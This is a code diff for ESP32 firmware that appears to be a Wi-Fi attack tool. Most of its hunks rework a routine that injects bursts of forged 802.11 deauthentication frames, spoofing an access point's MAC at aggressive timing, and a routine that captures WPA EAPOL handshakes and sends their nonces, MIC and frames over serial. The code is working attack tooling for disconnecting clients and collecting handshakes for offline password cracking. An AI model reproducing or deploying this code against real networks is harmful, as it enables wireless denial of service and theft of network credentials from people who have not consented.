@@ -47,6 +47,9 @@ static TaskHandle_t g_hopper_task = NULL;
 static SemaphoreHandle_t g_wifi_mutex = NULL;
 static SemaphoreHandle_t g_cache_mutex = NULL;
 
+// Static buffers to prevent heap fragmentation
+static char s_scan_json_buf[16384];
+
 // Statistics (atomic for thread safety)
 static atomic_uint_fast32_t g_m1_count = 0;
 static atomic_uint_fast32_t g_m2_count = 0;
@@ -321,49 +324,51 @@ esp_err_t wifi_scan_start(wifi_scan_cb_t callback) {
       uint16_t actual_count = ap_count;
       esp_wifi_scan_get_ap_records(&actual_count, ap_list);
 
-      char *json_buf = malloc(16384);
-      if (json_buf) {
-        int pos = snprintf(json_buf, 16384,
-                           "{\"type\":\"wifi_scan_result\",\"count\":%d,"
-                           "\"networks\":[",
-                           actual_count);
+      // Use static buffer instead of malloc to prevent heap fragmentation
+      char *json_buf = s_scan_json_buf;
 
-        for (int i = 0; i < actual_count && pos < 15800; i++) {
-          wifi_scan_result_t result = {0};
-          strncpy(result.ssid, (char *)ap_list[i].ssid, 32);
-          result.ssid[32] = '\0';
-          memcpy(result.bssid, ap_list[i].bssid, 6);
-          result.channel = ap_list[i].primary;
-          result.rssi = ap_list[i].rssi;
-          result.authmode = ap_list[i].authmode;
+      // Clear buffer reuse
+      json_buf[0] = '\0';
 
-          if (callback) {
-            callback(&result);
-          }
+      int pos = snprintf(json_buf, 16384,
+                         "{\"type\":\"wifi_scan_result\",\"count\":%d,"
+                         "\"networks\":[",
+                         actual_count);
 
-          char bssid_str[18];
-          snprintf(bssid_str, sizeof(bssid_str),
-                   "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0],
-                   result.bssid[1], result.bssid[2], result.bssid[3],
-                   result.bssid[4], result.bssid[5]);
+      for (int i = 0; i < actual_count && pos < 15800; i++) {
+        wifi_scan_result_t result = {0};
+        strncpy(result.ssid, (char *)ap_list[i].ssid, 32);
+        result.ssid[32] = '\0';
+        memcpy(result.bssid, ap_list[i].bssid, 6);
+        result.channel = ap_list[i].primary;
+        result.rssi = ap_list[i].rssi;
+        result.authmode = ap_list[i].authmode;
 
-          char escaped_ssid[65];
-          serial_escape_json(result.ssid, escaped_ssid, sizeof(escaped_ssid));
-
-          pos += snprintf(
-              json_buf + pos, 16384 - pos,
-              "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,"
-              "\"channel\":%d,\"encryption\":%d}%s",
-              escaped_ssid, bssid_str, result.rssi, result.channel,
-              result.authmode, (i < actual_count - 1) ? "," : "");
+        if (callback) {
+          callback(&result);
         }
 
-        if (pos < 16382) {
-          strcat(json_buf, "]}");
-        }
-        serial_send_json_raw(json_buf);
-        free(json_buf);
+        char bssid_str[18];
+        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 result.bssid[0], result.bssid[1], result.bssid[2],
+                 result.bssid[3], result.bssid[4], result.bssid[5]);
+
+        char escaped_ssid[65];
+        serial_escape_json(result.ssid, escaped_ssid, sizeof(escaped_ssid));
+
+        pos += snprintf(json_buf + pos, 16384 - pos,
+                        "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,"
+                        "\"channel\":%d,\"encryption\":%d}%s",
+                        escaped_ssid, bssid_str, result.rssi, result.channel,
+                        result.authmode, (i < actual_count - 1) ? "," : "");
       }
+
+      if (pos < 16382) {
+        strcat(json_buf, "]}");
+      }
+      serial_send_json_raw(json_buf);
+      // No free(json_buf) needed for static buffer
+
       free(ap_list);
     }
   }
@@ -497,59 +502,21 @@ esp_err_t wifi_send_deauth_burst(const uint8_t *target_mac,
     return ESP_ERR_INVALID_ARG;
   }
 
-  if (channel == 0) {
-    channel = g_current_channel;
-  }
-
   ESP_LOGI(TAG, "Deauth BURST(%d) to %02X:%02X... from %02X:%02X... ch%d",
            count, target_mac ? target_mac[0] : 0xFF,
            target_mac ? target_mac[5] : 0xFF, ap_mac[0], ap_mac[5], channel);
 
-  bool was_promisc = g_promiscuous_active;
-  bool was_hopping = g_channel_hopping;
-  uint8_t original_mac[6];
-  esp_wifi_get_mac(WIFI_IF_AP, original_mac);
-
-  // Stop hopping
-  if (was_hopping) {
-    g_channel_hopping = false;
-    while (g_hopper_running) {
-      vTaskDelay(pdMS_TO_TICKS(10));
-    }
+  // Zero-latency injection: stay in promiscuous mode, just change channel if
+  // needed
+  if (channel != 0 && channel != g_current_channel) {
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    g_current_channel = channel;
   }
 
-  if (was_promisc) {
-    esp_wifi_set_promiscuous(false);
-  }
-
-  esp_wifi_stop();
-  esp_wifi_set_mac(WIFI_IF_AP, ap_mac);
-
-  wifi_config_t ap_config = {
-      .ap = {
-          .ssid = "",
-          .ssid_len = 0,
-          .password = "",
-          .channel = (channel > 0 && channel <= 13) ? channel : g_current_channel,
-          .authmode = WIFI_AUTH_OPEN,
-          .ssid_hidden = 1,
-          .max_connection = 0,
-          .beacon_interval = 60000,
-      }};
-
-  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
-  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-  ESP_ERROR_CHECK(esp_wifi_start());
-  ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
-  ESP_ERROR_CHECK(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));
-
-  esp_wifi_set_promiscuous(true);
-  vTaskDelay(pdMS_TO_TICKS(10));
-
-  // Build deauth frame
+  // Build deauth frame (standard 802.11 management frame)
   uint8_t frame[26] = {
       0xC0, 0x00,                         // Frame Control (Deauth)
-      0x00, 0x00,                         // Duration
+      0x3A, 0x01,                         // Duration (314µs)
       0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA (broadcast or target)
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA (AP MAC)
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
@@ -557,49 +524,34 @@ esp_err_t wifi_send_deauth_burst(const uint8_t *target_mac,
       0x07, 0x00                          // Reason code
   };
 
+  // Set addresses
   if (target_mac) {
     memcpy(frame + 4, target_mac, 6);
   }
   memcpy(frame + 10, ap_mac, 6);
   memcpy(frame + 16, ap_mac, 6);
 
-  static const uint16_t reasons[] = {7, 6, 2, 4, 1};
-  static const int num_reasons = sizeof(reasons) / sizeof(reasons[0]);
+  // Set reason code
+  frame[24] = reason & 0xFF;
+  frame[25] = (reason >> 8) & 0xFF;
 
+  // Burst transmission - aggressive 500µs timing
   int sent = 0;
   for (int i = 0; i < count; i++) {
-    int r_idx = g_deauth_seq % num_reasons;
-    frame[24] = reasons[r_idx] & 0xFF;
-    frame[25] = (reasons[r_idx] >> 8) & 0xFF;
-
-    // Set sequence number (upper 12 bits of seq ctrl)
-    frame[22] = (g_deauth_seq & 0x0F) << 4;
-    frame[23] = (g_deauth_seq >> 4) & 0xFF;
+    // Update sequence number (upper 12 bits of seq ctrl field)
+    uint16_t seq_field = (g_deauth_seq << 4);
+    frame[22] = seq_field & 0xFF;
+    frame[23] = (seq_field >> 8) & 0xFF;
     g_deauth_seq++;
 
+    // Inject raw frame - works in Promiscuous Mode on ESP32
     esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
     if (ret == ESP_OK) {
       sent++;
     }
 
-    if (i % 5 == 0) {
-      vTaskDelay(pdMS_TO_TICKS(2));
-    } else {
-      ets_delay_us(500);
-    }
-  }
-
-  // Restore state
-  esp_wifi_stop();
-  esp_wifi_set_mac(WIFI_IF_AP, original_mac);
-
-  if (was_promisc) {
-    wifi_sniffer_start(channel); // Resume on target channel
-    if (was_hopping) {
-      g_channel_hopping = true;
-      xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
-                  &g_hopper_task);
-    }
+    // 500µs delay between frames is sufficient for receiver processing
+    ets_delay_us(500);
   }
 
   ESP_LOGI(TAG, "Deauth burst complete: %d/%d sent", sent, count);
@@ -612,7 +564,9 @@ esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
 }
 
 void wifi_set_sniffer_callback(wifi_sniffer_cb_t cb) { g_sniffer_cb = cb; }
-void wifi_set_handshake_callback(wifi_handshake_cb_t cb) { g_handshake_cb = cb; }
+void wifi_set_handshake_callback(wifi_handshake_cb_t cb) {
+  g_handshake_cb = cb;
+}
 void wifi_start_recon_mode(void) { g_recon_mode = true; }
 void wifi_stop_recon_mode(void) { g_recon_mode = false; }
 bool wifi_is_sniffing(void) { return g_promiscuous_active; }
@@ -792,7 +746,7 @@ static void process_eapol(const uint8_t *payload, int len, int header_len,
         g_handshake_cb(&hs);
       }
 
-      // Format and send JSON
+      // Format MACs for logging
       char bssid_s[18], sta_s[18];
       snprintf(bssid_s, sizeof(bssid_s), "%02X:%02X:%02X:%02X:%02X:%02X",
                hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4],
@@ -800,42 +754,46 @@ static void process_eapol(const uint8_t *payload, int len, int header_len,
       snprintf(sta_s, sizeof(sta_s), "%02X:%02X:%02X:%02X:%02X:%02X", hs.sta[0],
                hs.sta[1], hs.sta[2], hs.sta[3], hs.sta[4], hs.sta[5]);
 
-      char *json = malloc(2048);
-      if (json) {
-        char anonce_hex[65], snonce_hex[65], mic_hex[33], replay_hex[17];
-        bytes_to_hex(hs.anonce, 32, anonce_hex, sizeof(anonce_hex));
-        bytes_to_hex(hs.snonce, 32, snonce_hex, sizeof(snonce_hex));
-        bytes_to_hex(hs.mic, 16, mic_hex, sizeof(mic_hex));
-        bytes_to_hex(hs.replay_counter, 8, replay_hex, sizeof(replay_hex));
+      // Use binary protocol (COBS) for efficiency
+      // Struct:
+      // [BSSID(6)][STA(6)][ANonce(32)][SNonce(32)][MIC(16)][Replay(8)][Type(1)][Ver(1)][Len(2)][Data(n)]
+      // Total fixed: 104 bytes + variable payload
 
-        char *eapol_hex = malloc(hs.eapol_len * 2 + 1);
-        if (eapol_hex) {
-          bytes_to_hex(hs.eapol_frame, hs.eapol_len, eapol_hex,
-                       hs.eapol_len * 2 + 1);
+      uint8_t payload_buf[MAX_EAPOL_FRAME_SIZE + 128];
+      int p_idx = 0;
 
-          snprintf(json, 2048,
-                   "{\"type\":\"wifi_handshake\","
-                   "\"bssid\":\"%s\","
-                   "\"sta_mac\":\"%s\","
-                   "\"ch\":%d,"
-                   "\"rssi\":%d,"
-                   "\"anonce\":\"%s\","
-                   "\"snonce\":\"%s\","
-                   "\"mic\":\"%s\","
-                   "\"replay_counter\":\"%s\","
-                   "\"key_desc_type\":%d,"
-                   "\"key_desc_version\":%d,"
-                   "\"eapol_frame\":\"%s\","
-                   "\"eapol_len\":%d,"
-                   "\"timestamp\":%lu}",
-                   bssid_s, sta_s, hs.channel, hs.rssi, anonce_hex, snonce_hex,
-                   mic_hex, replay_hex, hs.key_desc_type, hs.key_desc_version,
-                   eapol_hex, hs.eapol_len, (unsigned long)hs.timestamp);
+      // Pack data
+      memcpy(payload_buf + p_idx, hs.bssid, 6);
+      p_idx += 6;
+      memcpy(payload_buf + p_idx, hs.sta, 6);
+      p_idx += 6;
+      memcpy(payload_buf + p_idx, hs.anonce, 32);
+      p_idx += 32;
+      memcpy(payload_buf + p_idx, hs.snonce, 32);
+      p_idx += 32;
+      memcpy(payload_buf + p_idx, hs.mic, 16);
+      p_idx += 16;
+      memcpy(payload_buf + p_idx, hs.replay_counter, 8);
+      p_idx += 8;
 
-          serial_send_json_raw(json);
-          free(eapol_hex);
-        }
-        free(json);
+      payload_buf[p_idx++] = hs.key_desc_type;
+      payload_buf[p_idx++] = hs.key_desc_version;
+
+      // Payload len (Big Endian)
+      payload_buf[p_idx++] = (hs.eapol_len >> 8) & 0xFF;
+      payload_buf[p_idx++] = hs.eapol_len & 0xFF;
+
+      // RSSI and Channel
+      payload_buf[p_idx++] = (uint8_t)(hs.rssi & 0xFF);
+      payload_buf[p_idx++] = hs.channel;
+
+      if (p_idx + hs.eapol_len <= sizeof(payload_buf)) {
+        memcpy(payload_buf + p_idx, hs.eapol_frame, hs.eapol_len);
+        p_idx += hs.eapol_len;
+
+        serial_send_cobs(0x02, payload_buf, p_idx); // Type 0x02 = Handshake
+      } else {
+        ESP_LOGE(TAG, "Handshake too large for binary buffer");
       }
 
       ESP_LOGI(TAG, "HANDSHAKE #%lu CAPTURED: %s <-> %s (v%d)",
@@ -882,13 +840,12 @@ static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
 
   if (count % 100 == 0) {
     char stats[128];
-    snprintf(
-        stats, sizeof(stats),
-        "{\"type\":\"sniff_stats\",\"count\":%lu,\"m1\":%lu,\"m2\":%lu,"
-        "\"complete\":%lu}",
-        (unsigned long)count, (unsigned long)atomic_load(&g_m1_count),
-        (unsigned long)atomic_load(&g_m2_count),
-        (unsigned long)atomic_load(&g_complete_count));
+    snprintf(stats, sizeof(stats),
+             "{\"type\":\"sniff_stats\",\"count\":%lu,\"m1\":%lu,\"m2\":%lu,"
+             "\"complete\":%lu}",
+             (unsigned long)count, (unsigned long)atomic_load(&g_m1_count),
+             (unsigned long)atomic_load(&g_m2_count),
+             (unsigned long)atomic_load(&g_complete_count));
     serial_send_json_raw(stats);
   }
 
